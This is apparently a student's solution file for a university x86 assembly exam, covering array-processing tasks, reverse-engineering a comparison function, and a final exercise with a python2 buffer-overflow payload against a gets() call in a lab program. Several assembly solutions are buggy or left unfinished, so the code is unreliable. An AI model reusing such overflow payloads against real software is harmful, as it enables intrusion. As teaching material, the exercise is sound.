@@ -1,0 +1,476 @@
+Examen CD IOCLA 2024 var 2
+
+
+
+ 
+1.
+
+
+;TODO a: Generate first `len` elements of `int_arr` defined as follows:
+    ; int_arr[i] = 17 * i + 3
+
+; TODO b: Count the number of elements strictly smaller than number pointed by `limit`
+
+; TODO c: Find and print the smallest number strictly greater than number pointed by `limit`
+
+
+
+2.
+
+
+; TODO a: Implement array printing function:
+    ; print_v(unsigned int len, unsigned int *v);
+
+; TODO b: Implement adjacent computing function:
+    ; elem_adj(unsigned int len, int k, unsigned int *v, unsigned int *w)
+
+; TODO c: Implement inplace computing function:
+    ; elem_inplace(unsigned int len, int k, unsigned int *v)
+
+
+
+
+
+task 1:
+
+
+%include "printf32.asm"
+extern printf
+
+section .data
+fmt db "%d ", 0
+limit dd  120
+len equ   10
+
+section .bss
+    ; TODO a: Reserve space for an array of `len` integers. The array name is `int_arr`
+    int_arr resd len
+
+section .text
+global main
+
+main:
+    push ebp
+    mov ebp, esp
+
+    ;TODO a: Generate first `len` elements of `int_arr` defined as follows:
+    ; int_arr[i] = 17 * i + 3
+    pusha
+    xor ecx, ecx ; contor pt for
+
+loop_a:
+    cmp ecx, len
+    jge print_a
+
+    mov eax, 17
+    mul ecx ; face ecx * eax adica i * 17 si pune rez in eax
+    add eax, 3 ; acum in eax am 17*i+3
+
+    mov [int_arr + ecx * 4], eax 
+
+    inc ecx
+    jmp loop_a
+
+print_a:
+    xor ecx, ecx
+
+loop_a_print:
+    cmp ecx, len
+    jge main_b
+
+    mov eax, [int_arr + ecx * 4]
+
+    ; PRINTF32 %d \0, eax
+    push ecx
+    push eax
+    push fmt
+    call printf
+    add esp, 8
+    pop ecx
+
+    inc ecx
+    jmp loop_a_print
+
+
+main_b:
+    ; TODO b: Count the number of elements strictly smaller than number pointed by `limit`
+
+    xor ecx, ecx ; contor pt for pt int_arr
+    xor edx, edx ; contor pt nr de numere < limit
+
+loop_b:
+    cmp ecx, len
+    jge print_b
+
+    mov eax, [int_arr + ecx * 4]
+    cmp eax, [limit]
+    jl mai_mic
+
+    inc ecx
+    jmp loop_b
+
+mai_mic:
+    inc edx
+    inc ecx
+    jmp loop_b
+
+print_b:
+    push edx
+    push fmt
+    call printf
+    add esp, 4
+    pop edx
+
+main_c:
+    ; TODO c: Find and print the smallest number strictly greater than number pointed by `limit`
+    mov eax, [int_arr + edx * 4]
+    push eax
+    push fmt
+    call printf
+    add esp, 8
+
+
+done:
+    popa
+    ; Return 0.
+    xor eax, eax
+    leave
+    ret
+
+
+
+
+
+task 2:
+
+
+
+extern puts
+extern printf
+
+section .rodata
+    format db "%u ", 0
+    puts_format db "", 0
+
+section .data
+    arr1 dd 10, 20, 30, 40, 50, 60, 70, 80, 11, 22, 33, 44, 55, 66, 77, 88, 99
+    ; b) c) Test with k = 1, 7, 0, 17, 18
+    len1 equ 17
+    k equ 18
+
+section .bss
+    dest resd 100
+
+section .text
+global main
+
+elem_adj:
+    push ebp
+    mov ebp, esp
+
+    ; TODO b: Implement adjacent computing function:
+    ; elem_adj(unsigned int len, int k, unsigned int *v, unsigned int *w)
+    mov eax, [ebp + 8] ; lungimea vectorilor
+    mov edx, [ebp + 12] ; k
+    mov esi, [ebp + 16] ; vectorul sursa
+    mov edi, [ebp + 20] ; vectorul destinatie
+
+    xor ecx, ecx
+repetitiva_inm:
+    cmp ecx, eax
+    je final_b
+
+    cmp ecx, edx
+    je repetitiva_sum
+
+    dec eax
+
+    cmp ecx, eax
+    jne caz_normal
+
+    inc eax
+    ; cazul in care sunt pe ultima poz
+    mov ebx, [esi + 4 * ecx]
+    push eax
+    push edx
+    mov eax, [esi]
+    mul ebx
+    mov [edi + 4 * ecx], eax
+    pop edx
+    pop eax
+    jmp sari
+
+caz_normal:
+    inc eax
+    mov ebx, [esi + 4 * ecx]
+    push eax
+    push edx
+    mov eax, [esi + 4 * ecx + 4]
+    mul ebx
+    mov [edi + 4 * ecx], eax
+    pop edx
+    pop eax
+
+sari:
+    inc ecx
+    jmp repetitiva_inm
+
+repetitiva_sum:
+    cmp ecx, eax
+    je final_b
+    dec eax
+    cmp ecx, eax
+    jne caz_n
+    ; daca sunt pe ultima pozitie
+    inc eax
+    mov ebx, [esi + 4 * ecx]
+    add ebx, [esi]
+    mov [edi + 4 * ecx], ebx
+    jmp peste
+
+caz_n:
+    inc eax
+    mov ebx, [esi + 4 * ecx]
+    add ebx, [esi + 4 * ecx + 4]
+    mov [edi + 4 * ecx], ebx
+
+peste:
+    inc ecx
+    jmp repetitiva_sum
+
+final_b:
+    leave
+    ret
+
+elem_inplace:
+    push ebp
+    mov ebp, esp
+
+    ; TODO c: Implement inplace computing function:
+    ; elem_inplace(unsigned int len, int k, unsigned int *v)
+
+    leave
+    ret
+
+print_v:
+    push ebp
+    mov ebp, esp
+
+    ; TODO a: Implement array printing function:
+    ; print_v(unsigned int len, unsigned int *v);
+
+    mov eax, [ebp + 8] ; in eax am lungimea vect
+    mov esi, [ebp + 12] ; in esi vectorul in sine
+
+    xor ecx, ecx
+loop_a:
+    cmp ecx, eax
+    je final_a
+
+    push eax
+    push ecx
+    push esi
+    push dword [esi + 4 * ecx]
+    push format
+    call printf
+    add esp, 8
+    pop esi
+    pop ecx
+    pop eax
+
+    inc ecx
+    jmp loop_a
+
+final_a:
+    leave
+    ret
+
+
+main:
+    push ebp
+    mov ebp, esp
+
+
+    ; Print arr1 using print_arr.
+    mov eax, arr1
+    mov ebx, len1
+    push eax
+    push ebx
+    call print_v
+    add esp, 8
+
+
+    ; Compute elems in dest using elem_adj.
+    push dest
+    push arr1
+    push k
+    push len1
+    call elem_adj
+    add esp, 16
+
+
+    ; Print dest using print_arr.
+    mov eax, dest
+    mov ebx, k
+    push eax
+    push ebx
+    call print_v
+    add esp, 8
+
+    ; Compute elem_inplace in arr1.
+
+    ; Print arr1 using print_arr.
+
+    ; Return 0.
+    xor eax, eax
+    leave
+    ret
+
+
+
+
+
+
+task 3:
+
+
+a)
+
+
+
+Find `compute` parameters so that calling `compute`
+ * function will return 0.
+
+
+a = 0x01010101 = 16843009
+b = 0x02020202 = 33686018
+
+
+void todo_a()
+{
+	int res;
+
+	res = compute( , );
+	if (!res) 
+		printf("a) Perfect! Go on!\n");
+	else
+		printf("a) Wrong answer. Try again\n");
+}
+
+
+
+pt functia asta:
+
+
+section .data
+
+prompt db 'Input string:', 0
+ok_str db 'c) Perfect. Go on!', 10, 0
+notok_str db 'c) Wrong answer. Try again!', 10, 0
+
+fmt db "%x", 10, 0
+
+section .text
+
+global compute
+global check_arrays
+global read_string
+
+extern printf
+extern gets
+extern exit
+
+; TODO a: compute(int a, b)
+
+compute:
+    push ebp
+    mov ebp, esp
+
+    ; preserve `ebx` as per calling convention
+    push ebx
+
+    mov eax, [ebp + 8]
+    mov edx, [ebp + 12]
+
+    cmp edx, 0x1000
+    jl not_ok
+
+    mov ecx, 4
+compare_loop:
+    mov bl, al
+    mov bh, dl
+    inc bl
+
+    cmp bl, bh
+    jne not_ok
+
+    shr eax, 8
+    shr edx, 8
+    loop compare_loop
+
+    mov eax, 0
+    jmp done
+
+not_ok:
+    mov eax, 1
+
+done:
+   ; Restore preserved register
+    pop ebx
+
+    leave
+    ret
+
+
+
+
+
+
+Verificarea valorii lui b:
+
+Inițial, funcția verifică dacă valoarea lui b este mai mică decât 0x1000.
+Dacă b este mai mic decât 0x1000, funcția va seta valoarea de returnare la 1 și va ieși (not_ok label). Pentru a evita acest lucru, b trebuie să fie cel puțin 0x1000.
+Bucla de comparare a octeților:
+
+Funcția intră apoi într-o buclă care se execută de 4 ori (valoarea ecx este setată la 4).
+În interiorul buclei:
+bl este încărcat cu octetul cel mai puțin semnificativ (LSB) al lui a.
+bh este încărcat cu LSB al lui b.
+bl este incrementat cu 1.
+bl incrementat este comparat cu bh.
+Dacă nu sunt egale, funcția setează valoarea de returnare la 1 și iese.
+Valorile lui a și b sunt deplasate la dreapta cu 8 biți (shr) la fiecare iterație pentru a verifica următorul octet.
+Returnare 0 în caz de succes:
+
+Dacă bucla se termină fără nicio inegalitate între bl și bh, funcția va seta eax la 0, indicând succesul.
+Pentru a găsi valori adecvate pentru a și b:
+
+b trebuie să fie ≥ 0x1000 pentru a trece de verificarea inițială.
+Pentru fiecare octet din a, octetul corespondent din b trebuie să fie exact cu 1 mai mare decât octetul corespondent din a.
+Aceasta trebuie să fie adevărat pentru toți cei 4 octeți, deoarece bucla se repetă de 4 ori și atât a, cât și b sunt deplasate la dreapta cu 8 biți în fiecare iterație.
+De exemplu:
+
+Să presupunem că a = 0x01010101.
+Pentru b, fiecare octet trebuie să fie octetul corespondent din a incrementat cu 1:
+b = 0x02020202.
+
+
+
+
+
+c)
+
+
+
+pt codul asta:
+
+  int local_88 [32];
+  int local_8;
+  
+  gets((char *)local_88);
+  if ((local_8 == local_88[0]) && (local_8 == 0x42)) {
+    return;
+  }
+
+
+python2 -c 'print "\x42\x00\x00\x00" + "A" * 31 * 4 + "\x42\x00\x00\x00" + "\x08\x04\x94\xa2"' > payload
